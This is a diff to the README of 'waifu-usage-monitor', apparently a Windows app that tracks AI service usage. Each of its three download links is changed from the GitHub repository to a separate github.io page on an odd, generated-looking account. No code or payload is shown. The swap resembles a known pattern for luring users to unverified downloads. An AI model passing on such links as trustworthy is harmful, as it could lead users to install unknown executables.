@@ -1,6 +1,6 @@
 # 🧠 waifu-usage-monitor - Your AI Usage Guardian Angel
 
-[![Download Now](https://img.shields.io/badge/Download-waifu--usage--monitor-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Adrienneunconstipated960/waifu-usage-monitor)
+[![Download Now](https://img.shields.io/badge/Download-waifu--usage--monitor-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://adrienneunconstipated960.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ Think of it as a fuel gauge for your AI tools. You'll never be surprised by a su
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: **[https://github.com/Adrienneunconstipated960/waifu-usage-monitor](https://github.com/Adrienneunconstipated960/waifu-usage-monitor)**
+Visit this link to download the application: **[https://adrienneunconstipated960.github.io](https://adrienneunconstipated960.github.io)**
 
 Once you're there, look for the **Releases** section or a **Download** button. Click it to get the latest version of the app.
 
@@ -189,7 +189,7 @@ Stay up to date with the latest improvements:
 
 Thank you for choosing waifu-usage-monitor. We hope this little companion makes your AI work smoother and more enjoyable. Now go create amazing things without worrying about hitting your limits!
 
-**[⬇️ Download Now – It's Free!](https://github.com/Adrienneunconstipated960/waifu-usage-monitor)**
+**[⬇️ Download Now – It's Free!](https://adrienneunconstipated960.github.io)**
 
 ---
 
